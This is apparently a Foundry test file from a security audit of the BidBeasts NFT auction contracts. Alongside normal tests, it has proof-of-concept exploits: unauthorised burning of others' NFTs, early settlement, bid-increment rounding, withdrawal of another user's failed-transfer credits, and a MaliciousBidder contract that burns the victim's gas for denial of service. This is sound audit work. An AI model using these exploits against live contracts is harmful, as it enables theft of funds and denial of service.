// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console, Vm} from "forge-std/Test.sol";
import {BidBeastsNFTMarket} from "../src/BidBeastsNFTMarketPlace.sol";
import {BidBeasts} from "../src/BidBeasts_NFT_ERC721.sol";

// A mock contract that cannot receive Ether, to test the payout failure logic.
contract RejectEther {
    // Intentionally has no payable receive or fallback
}

contract BidBeastsNFTMarketTest is Test {
    // --- State Variables ---
    BidBeastsNFTMarket market;
    BidBeasts nft;
    RejectEther rejector;

    // --- Users ---
    address public constant OWNER = address(0x1); // Contract deployer/owner
    address public constant SELLER = address(0x2);
    address public constant BIDDER_1 = address(0x3);
    address public constant BIDDER_2 = address(0x4);

    // --- Constants ---
    uint256 public constant STARTING_BALANCE = 100 ether;
    uint256 public constant TOKEN_ID = 0;
    uint256 public constant MIN_PRICE = 1 ether;
    uint256 public constant BUY_NOW_PRICE = 5 ether;
    uint256 public constant BID_AMOUNT = 1.2 ether;

    function setUp() public {
        // Deploy contracts
        vm.prank(OWNER);
        nft = new BidBeasts();
        market = new BidBeastsNFTMarket(address(nft));
        rejector = new RejectEther();

        vm.stopPrank();

        // Fund users
        vm.deal(SELLER, STARTING_BALANCE);
        vm.deal(BIDDER_1, STARTING_BALANCE);
        vm.deal(BIDDER_2, STARTING_BALANCE);
    }

    // --- Helper function to list an NFT ---
    function _listNFT() internal {
        vm.startPrank(SELLER);
        nft.approve(address(market), TOKEN_ID);
        market.listNFT(TOKEN_ID, MIN_PRICE, BUY_NOW_PRICE);
        vm.stopPrank();
    }

    // -- Helper function to mint an NFT ---
    function _mintNFT() internal {
        vm.startPrank(OWNER);
        nft.mint(SELLER);
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                            LISTING TESTS
    //////////////////////////////////////////////////////////////*/
    function test_listNFT() public {
        _mintNFT();
        _listNFT();

        assertEq(
            nft.ownerOf(TOKEN_ID),
            address(market),
            "NFT should be held by the market"
        );
        BidBeastsNFTMarket.Listing memory listing = market.getListing(TOKEN_ID);
        assertEq(listing.seller, SELLER);
        assertEq(listing.minPrice, MIN_PRICE);
    }

    function test_fail_listNFT_notOwner() public {
        _mintNFT();

        vm.prank(BIDDER_1);
        vm.expectRevert("Not the owner");
        market.listNFT(TOKEN_ID, MIN_PRICE, BUY_NOW_PRICE);
    }

    function test_unlistNFT() public {
        _mintNFT();
        _listNFT();

        vm.prank(SELLER);
        market.unlistNFT(TOKEN_ID);

        assertEq(
            nft.ownerOf(TOKEN_ID),
            SELLER,
            "NFT should be returned to seller"
        );
        assertFalse(
            market.getListing(TOKEN_ID).listed,
            "Listing should be marked as unlisted"
        );
    }

    /*//////////////////////////////////////////////////////////////
                            BIDDING TESTS
    //////////////////////////////////////////////////////////////*/

    function test_placeFirstBid() public {
        _mintNFT();
        _listNFT();

        vm.prank(BIDDER_1);
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);

        BidBeastsNFTMarket.Bid memory highestBid = market.getHighestBid(
            TOKEN_ID
        );
        assertEq(highestBid.bidder, BIDDER_1);
        assertEq(highestBid.amount, BID_AMOUNT);
        assertEq(
            market.getListing(TOKEN_ID).auctionEnd,
            block.timestamp + market.S_AUCTION_EXTENSION_DURATION()
        );
    }

    function test_placeSubsequentBid_RefundsPrevious() public {
        _mintNFT();
        _listNFT();

        vm.prank(BIDDER_1);
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);

        uint256 bidder1BalanceBefore = BIDDER_1.balance;

        uint256 secondBidAmount = (BID_AMOUNT * 120) / 100; // 20% increase
        vm.prank(BIDDER_2);
        market.placeBid{value: secondBidAmount}(TOKEN_ID);

        // Check if bidder 1 was refunded
        assertEq(
            BIDDER_1.balance,
            bidder1BalanceBefore + BID_AMOUNT,
            "Bidder 1 was not refunded"
        );

        BidBeastsNFTMarket.Bid memory highestBid = market.getHighestBid(
            TOKEN_ID
        );
        assertEq(
            highestBid.bidder,
            BIDDER_2,
            "Bidder 2 should be the new highest bidder"
        );
        assertEq(
            highestBid.amount,
            secondBidAmount,
            "New highest bid amount is incorrect"
        );
    }

    /*//////////////////////////////////////////////////////////////
                              AUDIT-TESTS
    //////////////////////////////////////////////////////////////*/

    function test_tryBuyNow() public {
        _mintNFT();
        _listNFT();

        uint256 sellerBalanceBefore = SELLER.balance;
        console.log("Seller balance before buy now:", sellerBalanceBefore);

        vm.prank(BIDDER_1);
        market.placeBid{value: BUY_NOW_PRICE}(TOKEN_ID);

        assertEq(
            nft.ownerOf(TOKEN_ID),
            BIDDER_1,
            "NFT should be transferred to buyer"
        );
        assertFalse(
            market.getListing(TOKEN_ID).listed,
            "Listing should be marked as unlisted"
        );

        // check fees and seller payout
        uint256 fees = market.s_totalFee();
        console.log("Total fees collected by contract:", fees);

        uint256 sellerBalanceAfter = SELLER.balance;
        console.log("Seller balance after buy now:", sellerBalanceAfter);

        assertEq(
            sellerBalanceAfter,
            sellerBalanceBefore + BUY_NOW_PRICE - fees,
            "Seller did not receive correct payout"
        );
    }

    function test_Fails_tryBiddingAfterBuyNow() public {
        _mintNFT();
        _listNFT();

        vm.prank(BIDDER_1);
        market.placeBid{value: BUY_NOW_PRICE}(TOKEN_ID);

        assertEq(
            nft.ownerOf(TOKEN_ID),
            BIDDER_1,
            "NFT should be transferred to buyer"
        );
        assertFalse(
            market.getListing(TOKEN_ID).listed,
            "Listing should be marked as unlisted"
        );

        vm.prank(BIDDER_2);
        vm.expectRevert();
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);
    }

    /*//////////////////////////////////////////////////////////////
    PROOF-OF-CONCEPT
    //////////////////////////////////////////////////////////////*/

    function test_UnauthorizedBurn() public {
        // Let's mint an nft, using the modifier provided in the test file itself
        _mintNFT(); // SELLER is the owner of this NFT, token_id = 0

        // Checking whether SELLER owns the NFT or not...
        assertEq(nft.ownerOf(TOKEN_ID), SELLER, "SELLER should own the NFT");

        // Let's spawn a malicious actor: Charlie
        address charlie = makeAddr("Charlie");

        // Charlie decides to burn the NFT of SELLER
        vm.prank(charlie);
        nft.burn(TOKEN_ID);

        // Does this token still exists? Well, No!!
        vm.expectRevert("ERC721NonexistentToken(0)");
        nft.ownerOf(TOKEN_ID);
    }

    function test_BurnDuringAuction() public {
        // Minting and listing the NFT through modifiers
        _mintNFT(); // Again to SELLER, token_id = 0
        _listNFT(); // NFT is listed by SELLER, with min_price = 1 ether, buy_now_price = 5 ether

        // After listing, the token gets transferred to the marketplace contract
        // Thus, `market` is the new owner...Let's check it
        assertEq(
            nft.ownerOf(TOKEN_ID),
            address(market),
            "marketplace contract should own the NFT"
        );

        // An Unlucky Bidder bids for it, hoping to get this precious gem
        vm.prank(BIDDER_1);
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID); // BID_AMOUNT = 1.2 ether

        // Charlie gets revived again
        address charlie = makeAddr("Charlie");

        // As it's in the middle of an auction, Charlie decides to burn the NFT
        vm.prank(charlie);
        nft.burn(TOKEN_ID);

        // As expected, this NFT with token_id = 0 no longer exists
        vm.expectRevert("ERC721NonexistentToken(0)");
        nft.ownerOf(TOKEN_ID);

        // Now, SELLER feels like this is the highest bid he can get so far, and decides to take it
        vm.prank(SELLER);
        vm.expectRevert("ERC721NonexistentToken(0)"); // It's bound to fail, obviously
        market.takeHighestBid(TOKEN_ID);

        // The NFT gets vanished, and the BIDDER_1 hard-earned ether got stuck
        (, uint256 amount) = market.bids(TOKEN_ID);
        console.log("BIDDER_1 stuck amount:", amount);
    }

    function test_PrematureAuctionSettlement() public {
        // Minting and listing the NFT through modifiers
        _mintNFT();
        _listNFT();

        // An early bidder bids for it
        vm.prank(BIDDER_1);
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);

        // Checking auction end time
        BidBeastsNFTMarket.Listing memory listing = market.getListing(TOKEN_ID);
        console.log("Initial Auction end time:", listing.auctionEnd); // 1 (block.timestamp) + 900 (15 minutes) = 901

        // Fast forward time by 15 minutes
        vm.warp(block.timestamp + 15 minutes);

        // BIDDER_1 settles the auction, as others missed the narrow window
        vm.prank(BIDDER_1);
        market.settleAuction(TOKEN_ID);

        // Checking ownership of the NFT
        assertEq(nft.ownerOf(TOKEN_ID), BIDDER_1, "NFT is still in contract");
    }

    function test_PrematureAuctionSettledEmission() public {
        _mintNFT();
        _listNFT();

        // Place bid - this will incorrectly emit AuctionSettled
        vm.recordLogs();
        vm.prank(BIDDER_1);
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);

        Vm.Log[] memory logs = vm.getRecordedLogs();

        // Count AuctionSettled events (should be 0, but will be 1)
        uint256 settledEventCount = 0;
        for (uint i = 0; i < logs.length; i++) {
            if (
                logs[i].topics[0] ==
                keccak256("AuctionSettled(uint256,address,address,uint256)")
            ) {
                settledEventCount++;
            }
        }

        console.log(
            "AuctionSettled event emitted during bidding:",
            settledEventCount
        );
        console.log(
            "Auction still active?",
            market.getListing(TOKEN_ID).listed
        );

        // Now actually settle the auction
        vm.warp(block.timestamp + 16 minutes);
        vm.recordLogs();
        vm.prank(BIDDER_1);
        market.settleAuction(TOKEN_ID); // Emits `AuctionSettled` in `_executeSale()`

        logs = vm.getRecordedLogs();
        settledEventCount = 0;
        for (uint i = 0; i < logs.length; i++) {
            if (
                logs[i].topics[0] ==
                keccak256("AuctionSettled(uint256,address,address,uint256)")
            ) {
                settledEventCount++;
            }
        }

        console.log(
            "AuctionSettled event emitted after settlement:",
            settledEventCount
        );
        console.log(
            "Number of times 'AuctionSettled' event got emitted: 2 (should be 1)"
        );
    }

    function test_bidIncrementPrecisionLoss() public {
        // Mint and list NFT
        _mintNFT();
        _listNFT(); // MIN_PRICE = 1 ether

        // Setting up an awkward bid amount that can cause precision loss
        uint256 bid_amount = 1.200000000000099999 ether;

        // Place first bid
        vm.prank(BIDDER_1);
        market.placeBid{value: bid_amount}(TOKEN_ID);

        (, uint256 amount) = market.bids(TOKEN_ID);
        console.log("First bid placed:", amount);

        // Calculating next minimum bids
        uint256 incorrectNextBidAmount = (amount / 100) *
            (100 + market.S_MIN_BID_INCREMENT_PERCENTAGE()); // S_MIN_BID_INCREMENT_PERCENTAGE = 5
        console.log(
            "Incorrect next min bid (due to precision loss):",
            incorrectNextBidAmount
        );

        uint256 correctNextBidAmount = (amount *
            (100 + market.S_MIN_BID_INCREMENT_PERCENTAGE())) / 100;
        console.log(
            "Correct next min bid (with actual 5% increase):",
            correctNextBidAmount
        );

        // Calculating difference between the two
        uint256 difference = correctNextBidAmount - incorrectNextBidAmount;
        console.log("Difference due to precision loss:", difference, "wei"); // Should be small but non-zero

        // 2nd bidder can easily place a bid with less than 5% increase due to this precision loss
        vm.prank(BIDDER_2);
        market.placeBid{value: incorrectNextBidAmount}(TOKEN_ID);

        (, amount) = market.bids(TOKEN_ID);
        console.log(); // just to give a space in console
        console.log("Placing second bid with incorrect min bid amount...");
        console.log("Second bid placed:", amount);
    }

    function test_cannotBidAtMinPrice() public {
        // Mint and list NFT
        _mintNFT();
        _listNFT(); // MIN_PRICE = 1 ether
        console.log("Minimum price set at:", MIN_PRICE);

        // Attempt to place a bid exactly at min price
        vm.prank(BIDDER_1);
        vm.expectRevert("First bid must be > min price");
        market.placeBid{value: MIN_PRICE}(TOKEN_ID);

        // Place a valid first bid above min price
        uint256 validBid = MIN_PRICE + 1 wei;
        vm.prank(BIDDER_1);
        market.placeBid{value: validBid}(TOKEN_ID);

        (, uint256 amount) = market.bids(TOKEN_ID);
        console.log();
        console.log("Valid first bid placed:", amount);
    }

    function test_UnauthorizedCreditWithdrawal() public {
        // Mint and list NFT
        _mintNFT();
        _listNFT();

        // funding some eth to rejector contract
        vm.deal(address(rejector), 10 ether);

        // Placing a initial bid through the rejector contract, which can't receive the ether
        vm.prank(address(rejector));
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);
        console.log("Rejector places a bid of:", BID_AMOUNT);

        // BIDDER_1 immediately buys the NFT at buy now price, causing payout of rejector to fall in `failedTransferCredits`
        vm.prank(BIDDER_1);
        market.placeBid{value: BUY_NOW_PRICE}(TOKEN_ID);
        console.log(
            "BIDDER_1 buys the NFT at buy now price:",
            BUY_NOW_PRICE,
            "leading to payout failure for rejector"
        );
        console.log();

        uint256 failedAmount = market.failedTransferCredits(address(rejector));
        console.log("Rejector's failed transfer credits:", failedAmount);

        uint256 contractBalanceBefore = address(market).balance;
        uint256 bidder2BalanceBefore = address(BIDDER_2).balance;
        console.log();
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("BIDDER_2 balance before:", bidder2BalanceBefore);

        // BIDDER_2 maliciously withdraws rejector’s credits
        vm.prank(BIDDER_2);
        market.withdrawAllFailedCredits(address(rejector));
        console.log();
        console.log("BIDDER_2 maliciously withdraws rejector's credits...");

        console.log();
        console.log("BIDDER_2 balance after:", address(BIDDER_2).balance);
        console.log("Contract balance after:", address(market).balance);
        assertEq(
            market.failedTransferCredits(address(rejector)),
            failedAmount,
            "Rejector's credits should remain unchanged"
        );

        // Gives the opportunity to withdraw again and again if contract has enough balance and `failedTransferCredits` of some address is non-zero
    }

    function test_dosAttackViaMaliciousContract() public {
        // First, let's mint and list nft
        _mintNFT();
        _listNFT();

        // Set a gas price (trying to keep it realistic, one can easily pick the latest one from: https://etherscan.io/gastracker)
        uint256 currentGasPrice = 392000000; // 0.392 gwei in wei
        vm.txGasPrice(currentGasPrice);

        console.log("=== DoS Attack Cost Analysis ===");
        console.log("Gas price set to:", currentGasPrice, "wei (0.392 gwei)");

        // Let's deploy the maliciousBidder contract
        MaliciousBidder maliciousBidder = new MaliciousBidder(address(market));

        // Gas at the start
        uint256 gasStart = gasleft();

        // placing bid through maliciousBidder contract
        maliciousBidder.bid{value: BID_AMOUNT}(TOKEN_ID);

        uint256 afterMaliciousBidderCall = gasStart - gasleft();
        console.log();
        console.log("MaliciousBidder placed initial bid");
        console.log(
            "Gas used in MaliciousBidder call (normal scenario):",
            afterMaliciousBidderCall
        );

        // Now let's play the role of BIDDER_1, which actually decided to buy the nft right away
        uint256 bidderGasStart = gasleft();
        vm.prank(BIDDER_1);
        market.placeBid{value: BUY_NOW_PRICE}(TOKEN_ID);
        console.log();
        console.log("BIDDER_1 placed the next bid");

        uint256 afterBidder1Call = bidderGasStart - gasleft();
        console.log(
            "Gas used in BIDDER_1 call (expensive scenario):",
            afterBidder1Call
        );

        // Calculate real-world costs (approx.)
        uint256 costInWei = afterBidder1Call * currentGasPrice;

        console.log();
        console.log("=== ATTACK RESULTS ===");
        console.log(
            "Gas units consumed by victim (BIDDER_1):",
            afterBidder1Call
        );
        // Try using https://eth-converter.com/ to convert wei to eth or usd
        console.log("Approximate cost of call in wei:", costInWei, "wei");

        // Check whether `failedTransferCredits` have the amount or not...
        uint256 amount = market.failedTransferCredits(address(maliciousBidder));

        console.log();
        console.log(
            "MaliciousBidder's Balance",
            address(maliciousBidder).balance
        );

        console.log(
            "Amount in failedTransferCredits for MaliciousBidder contract:",
            amount
        );
    }

    function test_NFTLockedInNonCompliantContract() public {
        // Mint and list NFT
        _mintNFT();
        _listNFT(); 

        // Deploy non-compliant receiver
        NonCompliantReceiver receiver = new NonCompliantReceiver();
        vm.deal(address(receiver), 10 ether);

        // Bid from non-compliant contract
        vm.prank(address(receiver));
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);

        // Warp time to end auction
        vm.warp(block.timestamp + 16 minutes);

        // Settle auction to transfer NFT to receiver
        vm.prank(OWNER);
        market.settleAuction(TOKEN_ID);

        // Verify NFT is owned by receiver
        assertEq(
            nft.ownerOf(TOKEN_ID),
            address(receiver),
            "NFT should be owned by non-compliant contract"
        );

        // Now NFT is stuck in receiver contract as it doesn't implement onERC721Received or any function to transfer it out
    }
}

contract MaliciousBidder {
    BidBeastsNFTMarket public market;

    constructor(address _market) {
        market = BidBeastsNFTMarket(_market);
    }

    function bid(uint256 tokenId) public payable {
        market.placeBid{value: msg.value}(tokenId);
    }

    receive() external payable {
        for (uint256 i = 0; i < 2435000; i++) {
            i * i;
        }
    }
}

contract NonCompliantReceiver {
    // No onERC721Received implementation
    receive() external payable {
        // Accept Ether but do nothing else
    }
}
